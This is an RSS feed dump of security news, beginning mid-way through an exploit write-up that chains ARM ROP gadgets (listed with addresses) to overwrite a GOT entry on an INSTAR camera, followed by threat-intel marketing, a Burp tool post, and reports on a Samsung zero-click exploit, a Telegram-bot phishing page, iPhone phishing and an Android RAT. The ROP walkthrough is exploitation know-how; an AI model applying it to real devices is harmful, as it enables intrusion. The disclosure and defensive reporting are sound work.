vulnerability. Within the vulnerable base64 decode function there is a call to  which is a libc function. Let’s have a look at its PLT and GOT entries.Using  we can see the address of the PLT entry inside  of To verify the corresponding GOT entry and actual address at runtime I set a breakpoint at the return statement after the overflow.As you can see the GOT entry is at  which points to the actual address of  at  within libc.Let’s see how far apart that  (0x76ba86f0) and  (0x76bbb920) are.So that means that if we can add 0x13230 to the address at  we have the address of .Gadgets, Gadgets and more GadgetsNow to the tedious part. The only thing between the high-level plan and RCE was a bunch of gadgets, right? I initially tried tools such as  to find and automatically chain gadgets, but ARM assembly offers many different, often multi-instruction ways to perform simple operations, e.g. add to a register or move values between registers. Those tools handle obvious, straightforward gadgets well, but they struggle once the gadget sequences become more complex. So in the end I reverted to manually searching and chaining gadgets with .If no short, straightforward gadgets are available, you must resort to longer ones. Typically, the longer a gadget is, the more side effects it has, for example, overwriting registers or changing the stack pointer. The challenge is therefore to find gadgets that implement the required primitive while introducing only manageable side effects that later gadgets can correct.The most crucial gadget in my chain was the one to add two values, preferably fully controllable. This would let me add the calculated offset to the address at  to get the address of . While there were a couple of gadgets to add static values like 0x1 or 0x2 to a register, these didn’t seem very useful because either a loop would be required to call them many times or the chain would become too long to reach the desired value. So I tried to find gadgets that added values from two registers such as the following one.# 0x000228d8: add r6, fp, r6; ldrb sb, [ip, #1]; ldr sl, [ip, #2]; blx r3;
: Adds fp (r11) and r6, stores result in r6: Dereferences ip (r12) + 1 byte, stores result in sb (r9): Dereferences ip (r12) + 2 word, stores result in sl (r10)As you can see here side effects can also mean that certain registers have to contain certain values beforehand. In this case ip (r12) has to contain a valid address that can be dereferenced. If that’s not the case, the program will crash.So we have a gadget that allows us to add fp (r11) and r6. Ideally we want the address of  in r6 and the offset we calculated earlier in fp (r11) giving us the address of  in r6 as an output of the gadget. But how do we get the address of  into r6? The address of  is known so we need a gadget to dereference it to obtain the address of  within libc.To accomplish this, let’s have a look at this gadget:# 0x000190ac: ldr r6, [r3, #0x10]; ldr r3, [r2, #4]; blx r3;
: Dereferences (r3 + 0x10), stores result in r6: Dereferences (r2 + 0x4), stores result in r3Exactly what we need, but as you can tell this gadget needs some specific preparation beforehand. To continue the chain with  we need to make sure  results in the next gadget of the chain. But that should be doable.Last but not least we need a gadget to jump to the calculated address. Unfortunately I simply couldn’t find one. I also couldn’t find ways of moving the address into another register for which call gadgets would exist. So where to go from here? I recalled that the GOT of the target binary is actually writable. So what about writing it back to the GOT? If that works we could just call  which would then load the altered address from the GOT and jump to it.Let’s try, here’s another gadget:# 0x0002a3f8: str r0, [r4, #4]; pop {r4, r5, r6, pc};
: Dereferences (r4 + 0x4) and stores value of r0: Continues the chainThis gadget enables us to store a value in r0 at . Given that we find gadgets to move our calculated address into r0 and  into r4 this allows us to write the tampered address back to the GOT.So if we could make everything line up the plan would be:Dereference  entry and store it in r6Add the calculated offset to  to the register r6Write the register r6 back to the GOT -> Prepare function arguments for The path wasn’t as straightforward as this write-up might imply. I spent quite some time trying to mix and match gadgets and even exchanged the ones discussed above numerous times until I came up with the following chain. Let me walk you through it.The function epilogue of the vulnerable base64 function conveniently allows us to populate r4 to r11 before jumping to the first gadget. So in this case I added some values to r6, r9 and r11 for later use.As a first step of the chain, we do some preparations.What we do here is basically this:Note that we store  in r3 so the following gadget can dereference it into r6. As discussed before we have to make sure that r2 contains a stack pointer so the chain can continue with .As shown above  is overwritten at runtime, so we need to make sure there is some scratch space on the stack so everything adds up properly.When jumping to the gadget at 0x1cad0 the stack looks like this:The stack pointer still points at the AAAA value. So we continue with some readjustments of the stack pointer and preparations of the r3 register.Next up is the discussed gadget to add ’s address an the calculated offset. The offset was already put into fp (r11) at the very beginning of the chain. Register r6 also contains ’s real address read from the GOT by now.The ip register can be disregarded as it won’t be used later and conveniently contained an address that points to the stack. Since we’re just reading from it, it also doesn’t invoke any undesirable side effects.As a next step we have a gadget that moves r6 into r0. So we move the calculated address (= ) into r0. Also, we prepare the r4 register for the next step. To deal with the side effects of this gadget some more padding is added.Finally, we reach the gadget that writes our calculated  address back to the GOT.To our convenience it also allows us to write  to r6.From here there isn’t much left to do. We move the stack pointer into r0 (first argument) and then call r6 which we previously populated with the address of .Attentive readers might have noticed this is a 32-bit binary, so why not just brute-force the address of ? This was indeed possible because the address space for 32-bit systems is significantly less than for 64-bit therefore the number of possible locations of libc is also a lot smaller. I used this approach for the first version of the exploit which worked fine. However, while probing for the correct address the exploit keeps crashing the target binary. If we think about a red team scenario this approach would be very noisy and should therefore be avoided. That’s why I decided to work out a more reliable exploit.We’ve now walked the full path from firmware extraction and analysis, through vulnerability identification, and exploitation. I hope reading this was as enjoyable for you as the actual research was for me.All vulnerabilities discovered during this research were reported through a responsible-disclosure process. Thanks to INSTAR for their prompt response, they fixed the issues and released an update within a short period of time. The 90-day disclosure period has elapsed, and along with this write-up the exploit is now publicly available here.]]></content:encoded></item><item><title>November 2025 Patch Tuesday: One Zero-Day and

With state-sponsored attacks, cybercrime, and AI-powered threats on the rise, organizations are doubling down on threat intelligence as their secret weapon for proactive defense.The 2025 State of Threat Intelligence is Recorded Future’s third annual flagship research report designed to take the pulse of the cybersecurity industry. Incorporating data from 615 cybersecurity executives, managers, and practitioners, the report reveals enterprise organizations’ use cases, challenges, and future investment plans.By sharing what we’ve learned, we hope to help organizations make smarter decisions about their investments, vendor choices, and program maturity. And, it helps keep us grounded in the real challenges our customers face every day.Check out key themes and highlights, and then explore the report for full details.Threat intelligence usage and adoptionThe report reveals that, in 2025, enterprises increasingly trust and rely on threat intelligence to inform business-critical decisions. Not only do 43% use it to guide strategic investments and planning, but most also say it helps them make decisions related to purchasing, risk assessment, and resource allocation.Compared to 2024, a larger percentage of organizations now have full-time threat intelligence teams, and 89% pay at least one threat intelligence vendor. Find out about their top use cases, how frequently they use it, and the variety of teams across their organizations that actively consume the intelligence.Threat intelligence spending and success metricsData breaches involving a third party doubled from 2024 to 2025, so no surprise that our survey found that most enterprise organizations allocate substantial cybersecurity budgets to threat intelligence. Seventy-six percent invest $250k or more per year in external threat intelligence products (excluding services), and 14% spend more than $1 million per year.When asked about how they measure the ROI of threat intelligence, most said their organizations focus on speed and efficiency gains. See how they rank success metrics, from improved threat detection and response times to reduction in the number of incidents to cost savings from prevented incidents.Challenges with threat intelligence maturityThe survey found that threat intelligence maturity is improving year over year, with 49% of surveyed security professionals saying their maturity level is advanced. In other words, they have tools that combine outputs from multiple threat intelligence sources, a dedicated threat intelligence team, and automated workflows that integrate with most security activities including business risk assessment.As their organizations increase investment to grow their maturity, survey respondents told us they’re also experiencing challenges related to threat intelligence vendors. Almost half are frustrated by poor integration with their existing security tools, but issues ranging from vendor credibility and cost effectiveness also come into play. Explore the challenges your peers are facing on the journey to threat intelligence maturity.Future plans to strengthen threat intelligenceFinally, we asked respondents to tell us how they plan to improve their threat intelligence maturity and outcomes. Ninety-one percent said they plan to invest more in threat intelligence in 2026, and more than half expect moderate to significant changes to their threat intelligence needs in the next 12 months.Given that 81% said they plan to consolidate threat intelligence vendors, they should prioritize vendors that support the most critical capabilities across a number of use cases. See the top five capabilities our respondents prioritize in their day-to-day work.Find out where your organization stands in relation to your peersThe 2025 State of Threat Intelligence Report makes it clear: As threat intelligence delivers increasing strategic value, forward-thinking enterprises are boosting investment and evolving their use cases.Download the report to discover ideas and information that can help your organization succeed on its own maturity journey.]]></content:encoded></item><item><title>Threat Intelligence &amp; the C-Suite</title><link>https://www.recordedfuture.com/blog/ti-from-soc-to-c-suite</link><author></author><category>threatintel</category><enclosure url="https://www.recordedfuture.com/blog/media_1675c04e910df4130163445af824111e54bac26e2.png?width=1200&amp;format=pjpg&amp;optimize=medium" length="" type=""/><pubDate>Wed, 12 Nov 2025 00:00:00 +0000</pubDate><source url="https://www.recordedfuture.com/">Recorded Future</source><content:encoded><![CDATA[From Defensive Maneuvering to Proactive Decision-MakingThreat intelligence is undergoing fundamental changes in both the breadth of its capabilities and its applications. We are seeing threat intelligence evolve from a tactical defensive tool—where teams are bringing in indicators of compromise and trying to make informed decisions around known risks—to a more proactive and strategic tool. Increasingly, enterprises are using threat intelligence to determine areas of investment, security tool purchasing, which supply chain or third party vendors to work with, and even how they train their employees.Rather than looking at threat intelligence as a kind of routine reporting reserved for security teams, organizations are beginning to see its value in broader business decisionmaking. Today, threat intelligence is being used across the enterprise, informing decisions from the board and executive levels all the way down to day-to-day security operations.With our 2025 State of Threat Intelligence report finding that 83% of organizations now run full-time threat intelligence teams, and most use intelligence to guide daily or weekly operations, it’s clear that what once began as a tactical advantage has now become a strategic necessity.A Seat at the Boardroom Table: The Strategic Maturation of Threat IntelligenceThese changes constitute a true paradigm shift in today’s enterprise security operations. In relatively short order, threat intelligence has evolved from just another security tool to an essential source of information for business strategy. So, what fueled this change?Threat intelligence was once the domain of analysts hunched over indicators and dashboards. But as cyber risk began shaping balance sheets and brand value, intelligence moved beyond the SOC. Today, it informs everything from vulnerability management and incident response to compliance, insurance, and executive protection. The same datasets that once helped detect intrusions now guide procurement choices, risk modeling, and crisis communication plans.As a result, we are seeing threat intelligence used by more than just security teams. It is now being used by governance, risk & compliance (GRC) teams, fraud teams, physical security teams, marketing and communications teams, and perhaps most importantly, by executive leadership teams and board leadership.Modern threat intelligence shifts the narrative from “are we secure?” to “how much risk can we tolerate?” We're never going to reach zero risk. But with threat intelligence, we can ensure that we're operating at an acceptable level, where we can keep under control those things that would cause business disruption, competitive disadvantage, financial implications or regulatory failures.In our 2025 State of Threat Intelligence Report, Recorded Future found that nearly three-quarters (73%) of surveyed security professionals report using threat intelligence, along with 48% of Incident response teams, 47% of risk management teams, and 46% vulnerability management teams.This continued spread of threat intelligence across business functions signals a shift from threat intelligence as a tool for optimizing defensive posture to one for optimizing strategic integration and risk management.The Board’s New Dashboard: Threat Intelligence as a Business TranslatorAs the board’s appetite for timely, relevant risk insight grows, threat intelligence provides a vital bridge between technical data and strategic clarity. Boards are increasingly demanding information and briefings that translate adversarial behavior into plain-language impacts, such as:Threat Intelligence-informed presentations shaping risk committee agendasExecutive protection and brand monitoring as extensions of enterprise intelligenceThreat Intelligence-driven prioritization of cybersecurity budgets and third-party vettingWe can see these new applications play out in routine, yet vital, processes across the modern enterprise. Consider the following two scenarios and how they illustrate the ways in which threat intelligence is being used to determine executive and board-level decision-making:High-risk, high-impact threats (like ransomware campaigns or geopolitical disruption) trigger strategic investment in contingency planning and data redundancy, and/or decisions around where to do business.Persistent but lower-impact risks may inform tolerance thresholds or shape insurance coverage decisions.These examples demonstrate how intelligence enables boards to truly act on risk, not just acknowledge it. With these tools, organizations are now able to use threat intelligence to decide which businesses to work with, which technologies to bring on board, and whether or not the business can expand into new regions safely and effectively.Enterprises are increasing threat intelligence spend as security shifts from reactive defense to a holistic, intelligence-driven strategy. Modern intelligence helps detect attacks sooner, prioritize critical risks, and respond faster—strengthening vulnerability management, incident response, and board-level risk decisions. With ransomware, supply-chain attacks, and regulatory pressure on the rise, intelligence is now central to smarter, faster, and more effective enterprise-wide action.2025 State of Threat Intelligence ReportIntelligence as the Backbone of Enterprise Agility: How Threat Intelligence Keeps Orgs On Their ToesWhereas in the past, an organization might use threat intelligence to inform their security posture, today, threat intelligence is being used in a much more holistic way, directly powering overall enterprise adaptability, resilience, and governance outcomes.In today’s rapidly changing threat landscape—with the growth of advanced, AI-enabled threats, supply-chain attacks, and shifting global regulations—boards can no longer afford to rely on static risk models. And it is comprehensive, timely, and relevant threat intelligence that helps keep today’s models dynamic.The majority of organizations today use threat intelligence to guide business decisions related to purchasing, risk assessment, and resource allocation. In our 2025 State of Threat Intelligence Report, Recorded Future found that:Nearly two-thirds (65%) of surveyed security professionals say threat intelligence directly supports security technology purchasing decisions58% say it guides risk assessment for business initiatives53% say it supports incident response resource allocationWith all of these figures representing year-over-year increases, it’s safe to say that the majority of organizations have already adopted this more holistic view of threat intelligence. And for those that haven’t, all signs seem to suggest that they soon will. At the very least, we can say that they certainly ought to.Intelligence-Driven Governance Is Essential for Modern Risk ManagementThe widespread adoption of threat intelligence across operations (including board-level decision-making) marks a turning point in how organizations perceive risk and value intelligence. No longer confined to security operations, threat intelligence is now a cornerstone of enterprise governance—a means of continuously informing executive and board-level risk decisions with clarity and confidence.In both its capabilities and its applications, threat intelligence has evolved dramatically over recent years, maturing from a reactive tool to a foundation for informed risk decisionmaking across the enterprise. From the SOC team, to the C-suite, and all the way to the board, threat intelligence is being used to inform a wide range of critical business decisions. With this larger shift in security from a reactive defense to a holistic, intelligence-driven strategy engine, enterprises are expanding their understanding and use of threat intelligence and seeing meaningful benefits as a result.Interested in making modern threat intelligence a part of your board’s operations?

**Updated:** 11 November 2025 at 14:41 UTC

If you've ever used Burp Intruder or Turbo Intruder, you'll be familiar with the ritual of manually digging through thousands of responses by repeatedly sorting the table via length, status code, etc. I've developed an algorithm called HTTP Anomaly Rank which can efficiently pick out the most interesting responses for you.

HTTP Anomaly Rank is now integrated into Turbo Intruder and automatically places the most anomalous findings at the top of the results table without you needing to lift a finger.

We've also integrated this algorithm into Burp Suite's API in release 2025.10, so you can easily use it in your own tools. Since it can efficiently sift through massive result sets, it's particularly useful for anyone who wants to build AI based features.

In this post I'll explain how the algorithm works in depth but first, here's a quick demo:

HTTP Anomaly Rank evolved from the diffing logic I developed during my Backslash Powered Scanner: Automating Human Intuition research back in 2016. I built Backslash Powered Scanner to discover unknown injection vulnerability classes by recognising subtle differences in responses to payload pairs such as " vs ". Accurately diffing HTTP responses is a notoriously difficult problem as they're often very noisy, but I eventually found a reliable approach based on calculating a large number of response attributes (think status code, line count, exact byte sequence...), identifying which ones are stable, and using these for response comparison. This let me answer the question "Are the responses to these two payloads consistently different", and automate discovery of some really nice vulnerabilities. Check out the whitepaper and presentation for the full details.

HTTP Anomaly Rank scores every response based on how different it is from the others. First, it calculates a weight for every attribute based on how stable it is.

PayloadStatusContent-TypeWord-countCRC32administrator403text/html812d753916dadmin403text/html8125129f3bdsales503text/html97710639dbaccounting200text/html8123978f20fADMIN403text/html8119fa1cbc1root503text/html9727df2486test403text/html812e45449e7

For example, consider the response set above.

The algorithm then looks at every response, and assigns it a score based on how unique the attribute values seen on that response are, combined with how unique it is. In this example, ADMIN ends up with the highest score because it has a unique word-count.

This approach means it can detect and flag responses with tiny discrepancies, even when the overall response content is very noisy - check the video above for an example.

The score increases in accuracy as we collect more responses. The calculation is quite computationally heavy but the algorithmic complexity is O(N) so it scales well. In Turbo Intruder, I made the score only get calculated when the attack is completed to minimise wasted CPU cycles.

Part of my vision for Turbo Intruder is to require as few user clicks as possible. To help achieve this, it will now automatically sort the results table by the anomaly rank column when the attack completes. Hopefully this strategy works for you but if not, you can override it and automatically sort by any column of your choice using table.setSortOrder()

I'm looking forward to announcing some more quality of life updates for Turbo Intruder soon!

If you see the "Anomaly Rank" column but it's always set to 0, that means you need to update Burp Suite. This feature is available in 2025.10 and later.

Let me know how you find it, and if you'd like this feature in Burp Intruder too.

Enjoy!]]></content:encoded></item><item><title>Samsung zero-day lets attackers take over your phone</title><link>https://www.malwarebytes.com/blog/news/2025/11/patch-now-samsung-zero-day-lets-attackers-take-over-your-phone</link><author></author><category>threatintel</category><pubDate>Tue, 11 Nov 2025 14:28:04 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[So, for many cybersecurity professionals, CISA adding this vulnerability to the list signals both urgency and confirmation of active, real-world exploitation.CVE-2025-21042 was reportedly exploited as a remote code execution (RCE) zero-day to deploy LANDFALL spyware on Galaxy devices in the Middle East. But once that happens, other criminals tend to quickly follow with similar attacks.The flaw itself is an out-of-bounds write vulnerability in Samsung’s image processing library. These vulnerabilities let attackers overwrite memory beyond what is intended, often leading to memory corruption, unauthorized code execution, and, as in this case, device takeover. CVE-2025-21042 allows remote attackers to execute arbitrary code—potentially gaining complete control over the victim’s phone—without user interaction. No clicks required. No warning given.Samsung patched this issue in April 2025, but CISA’s recent warning highlights that exploits have been active in the wild for months, with attackers outpacing defenders in some cases. The stakes are high: data theft, surveillance, and compromised mobile devices being used as footholds for broader enterprise attacks.​The exploitation playbook is as clever as it is dangerous. According to research from Unit 42, criminals (likely private-sector offensive actors operating out of the Middle East) weaponized the vulnerability to deliver LANDFALL spyware through malformed Digital Negative (DNG) image files sent via WhatsApp. DNG is an open and lossless RAW image format developed by Adobe and used by digital photographers to store uncompressed sensor data.The attack chain works like this:The victim receives a booby-trapped DNG photo file.The file, armed with ZIP archive payloads and tailored exploit code, triggers the vulnerability in Samsung’s image codec library.This is a “zero-click” attack: the user doesn’t have to tap, open, or execute anything. Just processing the image is enough to compromise the device.It’s important to know that Samsung addressed another image-library flaw, CVE-2025-21043, in September 2025, showing a growing trend: image processing flaws are becoming a favorite entry point for both espionage and cybercrime.What should users and businesses do?Our advice to stay safe from this type of attack is simple:If you haven’t updated your Samsung device since April, do so. FCEB organizations have until December 1, 2025, to comply with CISA’s operational directive.Be wary of unsolicited messages and files, especially images received over messaging apps.Download apps only from trusted sources and avoid sideloading files.Zero-days targeting mobile devices are becoming frighteningly common, but the risk can be lowered with urgent patching, awareness, and solid security controls. As LANDFALL shows, the most dangerous attacks today are often the quietest—no user action required and no obvious signs until it’s too late.Device models targeted by LANDFALL:We don’t just report on phone security—we provide it]]></content:encoded></item><item><title>NHS providers reviewing stolen Synnovis data published by cyber criminals</title><link>https://databreaches.net/2025/11/11/nhs-providers-reviewing-stolen-synnovis-data-published-by-cyber-criminals/?pk_campaign=feed&amp;pk_kwd=nhs-providers-reviewing-stolen-synnovis-data-published-by-cyber-criminals</link><author>Dissent</author><category>databreach</category><pubDate>Tue, 11 Nov 2025 14:03:24 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Gates Down: Third Circuit Says Breaking Employer Computer Access Policies Is Not Hacking</title><link>https://databreaches.net/2025/11/11/gates-down-third-circuit-says-breaking-employer-computer-access-policies-is-not-hacking/?pk_campaign=feed&amp;pk_kwd=gates-down-third-circuit-says-breaking-employer-computer-access-policies-is-not-hacking</link><author>Dissent</author><category>databreach</category><pubDate>Tue, 11 Nov 2025 14:02:16 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>How credentials get stolen in seconds, even with a script-kiddie-level phish</title><link>https://www.malwarebytes.com/blog/threat-intel/2025/11/how-credentials-get-stolen-in-seconds-even-with-a-script-kiddie-level-phish</link><author></author><category>threatintel</category><pubDate>Tue, 11 Nov 2025 13:17:43 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[This attempt to phish credentials caught our attention, mostly because of its front-end simplicity. Even though this is a script-kiddie-level type of attack, we figured it was worth writing up—precisely because it’s so easy to follow what they’re up to.The email is direct and to the point. Not a lot of social engineering happening here.Pls kindly find the attached PO please send us PI once its available.”The sender’s address belongs to a Czechoslovakian printing service (likely compromised), and the name and phone number are fake. The target is in Taiwan.The attached  file is a tidy fake login screen that doesn’t really specify which credentials they want:The pre-filled email address in the screenshot is a fake one I added; normally it would be the target’s email.We assume the phisher welcomes any credentials entered here, and are counting on the fact that most people reuse passwords on other sites. Under the hood, the functionality of this attachment lies in this piece of JavaScript.It starts with simple checks to make sure all the fields are filled out and long enough before declaring the Telegram bot that will receive the login details.Using Telegram bots provides the phishers with several advantages:Stolen credentials are delivered instantly to the attacker via Telegram notifications. No need for the phisher to keep checking a database or inbox.Telegram is a legitimate, globally distributed messaging service, making it difficult to block.There’s no exposed web server or obvious phishing “drop site” that can be blocklisted or shut down.The last line contains a credibility trick:setTimeout(() => {window.location.assign("file:///C:/Users/USER/Downloads/Invoice_FAC_0031.pdf")}, 2000);This tries to open a file on the user’s computer after waiting 2 seconds (2,000 milliseconds). Since this file almost certainly doesn’t exist, the browser will either block the action (especially from an email or non-local file) or show an error. Either way, it will make the login attempt look more legitimate and take the user’s mind off the fact that they just sent their credentials who knows where.That’s really all there is to it, except for a bit of code that the dungeon-dweller forgot to remove during their copy-and-paste coding. Or they had no idea what it was for and left it in place for fear of breaking something.I suspect the attacker originally used this code to encrypt the credentials with a hardcoded AES (Advanced Encryption Standard) key and injection vector, then send them to their server.This attacker replaced that method with the simpler Telegram bot approach (much easier to use), but left the decryption stub because they were afraid removing it would break something.Don’t fall for phishing attemptsEven though the sophistication level of this email was low, that does not reduce the possible impact of sending the attacker your credentials.In phishing attempts like these, two simple rules can save you from lots of trouble.Don’t open unsolicited attachmentsCheck if the website address in the browser matches the domain you expect to be on (e.g. adobe.com).Other important tips to stay safe from phishing in general:Verify the sender: Always check if the sender’s email address matches what you would expect it to be. It’s not always conclusive but it can help you spot some attempts.Check through an independent channel if the sender actually sent you an attachment or a link.Keep your device and all its software updated.Use multi-factor authentication for every account you can.Use a password manager. Password managers will not auto-fill a password to a fake site, even if it looks like the real deal to you.If you already entered credentials on a page you don’t trust, change your passwords immediately. You can also upload screenshots of suspicious emails to Malwarebytes Scam Guard. It would have recognized this one as a phishing attempt.We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline.

Without your passcode, fingerprint or face to unlock it, it would be useless to anyone else. Now, though, some phone thieves have found a workaround, not by breaking Apple’s security, but by tricking owners into giving them the keys. The Swiss National Cyber Security Centre (NCSC) has issued a warning about phishing scams targeting iPhone owners who’ve lost their devices.Phishing for Apple ID credentialsWhen you report an iPhone as lost in Apple’s  app, you can set a custom lock-screen message that appears on the missing device. Many people include an email address or phone number in that message so a helpful stranger can contact them if the phone turns up.Unfortunately, that’s the very information scammers use to reach you. A thief (or anyone who now has the phone) can see that contact detail on the screen and send you a convincing message—usually by text, iMessage, or email—claiming to have found your device.The scam messages often include details copied from the phone itself, such as its model and color, to make it sound authentic. It also includes a link to a fake website that mimics the Find My service that Apple operates to locate lost devices. The site will ask for the victim’s Apple ID credentials.If the victim takes the bait, the thief can use those credentials to gain full access to the phone. That enables them to wipe it, returning it to factory settings for resale.Although the NCSC didn’t say so, an enterprising thief could get up to all kinds of other shenanigans. They might reset the user’s Apple ID to lock them out—even on a replacement device, access their photos (yes, including any risqué ones), read their emails and nose through their apps. In short, it would give them carte blanche to your digital life.These attacks don’t have to happen immediately. The perpetrators might text months after the device has been lost, when victims might have moved on and lowered their guard.The good news… and the badThe warning is both good and bad news. It’s good news because it shows that criminals are apparently unable to bypass Apple’s Activation Lock protection through technical means. The Activation Lock, turned on when you activate Find My, registers a device ID on Apple’s activation servers. Even if the criminals reset your device, the activation lock will still be there. Only someone with the user’s Apple ID credentials can unlock it. It’s a version of something called Factory Reset Protection (FRP) that the US mandated under the US Smart Phone Theft Prevention Act of 2015. Android phones have similar lock functionality.The warning is bad news because phone owners are human, and humans are often the easiest security system to defeat. Phishing schemes that target phone theft victims are big business. Back in 2017, security reporter Brian Krebs documented “phishing as a service” platforms that did it at scale, on a subscription basis. Vice found toolkits like ProKit for phishing to unlock phones on sale for around $75.We’ve already written about how the phone theft industry operates. Police in the UK recently uncovered a network stealing up to 40,000 phones per year. Most were shipped overseas to countries including China, where they would be used as profitably as possible. Locked phones might be broken up for parts, but a phone restored to factory settings that can be activated from scratch is far more valuable.What to do if your iPhone is stolenIgnore any messages from “Apple” claiming your lost phone has been found. The NCSC says Apple will never text or email customers about a recovered device.If you lose your phone,  right away in to lock it and display your contact message. Use a different contact number or email (not the one linked to your Apple ID or main phone) so scammers can’t use that information to target you.Protect your SIM, too: enable  immediately, and ask your carrier to  if the phone has been stolen.We can’t easily stop thieves stealing people’s phones, or control who sees our phones after they leave our hands. But a little forethought now can help you to stop criminals from accessing your digital life or selling your phone on in its current form if it does enter the underground supply chain.We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline.

The incident may have led to the compromise of draft reports, economic forecasts, internal emails, and other confidential data. The attack has been attributed to the Chinese state-sponsored APT group known as Silk Typhoon.Hyundai AutoEver America was hit by a cyber attack that resulted in unauthorized access to its IT environment, exposing sensitive personal information, including names, Social Security Numbers, and driver’s license numbers. The attack, which occurred between February 22 and March 2, 2025, affected employees, customers, or users, although the exact number of affected individuals remains unclear.Swedish IT systems supplier Miljödata has suffered a data breach that resulted in the exposure and theft of personal data belonging to up to 1.5 million individuals, including names, email addresses, physical addresses, phone numbers, government IDs, and dates of birth. The incident disrupted operations across multiple Swedish municipalities, affecting both children and protected identity subjects. The stolen data was published on the dark web by the threat group Datacarry.Japanese media giant Nikkei has experienced a cyber-attack caused by malware infection. The attack resulted in unauthorized access to its Slack messaging platform, exposing the personal information of over 17,000 employees and business partners, including names, email addresses, and chat histories.Polish online loan platform SuperGrosz, operated by AIQLABS, has disclosed a breach exposing personal data of at least 10,000 customers, including names, addresses, ID and tax numbers, phone contacts, employment details, and bank account numbers. The disclosure follows a separate distributed denial-of-service (DDoS) attack on a Polish mobile payment leader Blik that disrupted instant transfers and cash withdrawals. No actor has claimed responsibility, though Polish authorities have suggested a possible Russian link to the Blik attack.SonicWall has confirmed that a state-sponsored threat actor was behind the September attack that resulted in the theft of all firewall configuration files stored in its cloud backup environment via an API call. The breach exposed encrypted credentials and device configuration data contained in those files, enabling potential targeted attacks. All customers who used the cloud backup service were affected.VULNERABILITIES AND PATCHESCheck Point Research has uncovered four critical vulnerabilities in Microsoft Teams that allow attackers to impersonate users, manipulate messages, notifications, displayed names and forge caller identities in video and audio calls. Microsoft fixed the flaws and officially tracked the notification spoofing flaw as CVE-2024-38197.Check Point Research detected an exploit that drained $128.64M from Balancer V2. The attacker combined a rounding error vulnerability in a certain function with carefully crafted batchSwap operations. It allowed the attacker to artificially suppress Balancer Pool Token prices and extract value through repeated arbitrage cyclesA critical remote command execution vulnerability, CVE-2025-48703, affecting CentOS Web Panel (CWP) versions prior to 0.9.8.1204 is actively being exploited in the wild It enables remote, unauthenticated attackers with knowledge of a valid username to execute arbitrary shell commands as that user. A patch addressing the issue was released in version 0.9.8.1205.Point IPS provides protection against this threat (CentOS Web Panel Command Injection (CVE-2025-48703))Cisco warns of a new attack variant targeting Secure Firewall ASA and FTD that exploits CVE-2025-20333 (RCE as root via crafted HTTP) and CVE-2025-20362 (unauthenticated restricted-URL access), causing unpatched devices to reload into DoS. Both flaws were previously abused as zero-days in late September to deliver RayInitiator and LINE VIPER malware.Point IPS provides protection against this threat (Cisco Multiple Products Buffer Overflow (CVE-2025-20333); Cisco Multiple Products Authentication Bypass (CVE-2025-20362))THREAT INTELLIGENCE REPORTSCheck Point Research demonstrated a new way to use ChatGPT for malware analysis directly from the web interface, analyzing XLoader malware. The workflow using exported IDA data enables static analysis, rapid decryption, IoC extraction, and hidden C2 discovery.Point Threat Emulation and Harmony Endpoint provide protection against this threat (Trojan.Wins.Xloader; Trojan.Win.Xloader; Trojan.Wins.Xloader.ta.*)Check Point discovered AI-driven pharma scams that deepfake doctors and clinics to sell counterfeit drugs.

Usually, it’s up to the buyer to spread the malware, but Fantasy Hub goes a step further—it comes with full documentation, video tutorials, and a subscription model that makes it easy for even inexperienced attackers to use. Its creators provide step-by-step guides to create fake Google Play pages that imitate apps like Telegram or online banking portals, complete with realistic reviews. It’s a Remote Access Trojan (RAT) that anyone can distribute.Distribution relies heavily on social engineering and phishing. Attackers use Fantasy Hub’s templates and tools to set up convincing fake app pages, tricking users into downloading the malicious software. A “dropper” option even lets buyers upload any Android app APK and get back a modified version with Fantasy Hub added.These counterfeit apps look legitimate, and often request only a single permission: SMS access. But that permission unlocks much more. The SMS handler role bundles multiple powerful permissions: contacts, camera, and file access into a single authorization step, unlocking extensive control over the device’s messaging, contacts, and camera functions. Fantasy Hub is designed to bypass standard security checks and can remain concealed, making detection difficult for users.Once installed, Fantasy Hub can steal SMS messages, call logs, contacts, photos, and videos. It can also intercept, reply to, and delete notifications. More dangerously, it can initiate live audio and video streams using the device’s camera and microphone without the user’s consent. It’s been found in imitation banking apps, displaying fake windows to harvest user credentials such as usernames, PINs, and passwords. As part of the handy pack provided by Fantasy Hub’s creators, attackers are given tools to tailor these phishing windows for almost any banking app they wish to target.While individuals at at risk from this malware, the threat extends to organizations that use Bring Your Own Device (BYOD) policies or rely on mobile banking and work apps. A single infected phone could expose company data or communications.Fantasy Hub shows how easily cybercriminals can now buy and run complex spyware. But a few simple habits can help you stay safe:Stick to trusted sources. Download apps only from Google Play, Apple’s App Store, or the official provider. Your bank will never ask you to use another source. Use an up-to-date real-time anti-malware solution like Malwarebytes for Android, which already detects this malware as Android/Trojan.Spy.ACRF949851CC4. Does it really need the permissions it’s requesting to do the job you want it to do? Especially if it asks for SMS or camera access.Unsolicited communications. Stay wary of messages, emails, or links urging you to “update” or install outside the official app stores.We don’t just report on phone security—we provide it]]></content:encoded></item><item><title>⚡ Weekly Recap: Hyper-V Malware, Malicious AI Bots, RDP Exploits, WhatsApp Lockdown and More</title><link>https://thehackernews.com/2025/11/weekly-recap-hyper-v-malware-malicious.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEihDn-ouAjSamS6qppMqJQp0muEjFRy3-Rs2m4u6iNunhDZUPSbi9CQMC1Ub8r7CFkHVo_7B98nwiZbsLlbg2Xq_Im67d6GvqaEaq3ZILZfZVhYafqJydsDCggwkh_n3q-XDcZJ_JLFalQ7E_KK-nYa9_YrOZl62NnyglLa5vmtdWPF7K9lH07l32yv72CI/s1600/recap-nov.jpg" length="" type=""/><pubDate>Mon, 10 Nov 2025 12:51:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cyber threats didn’t slow down last week—and attackers are getting smarter.

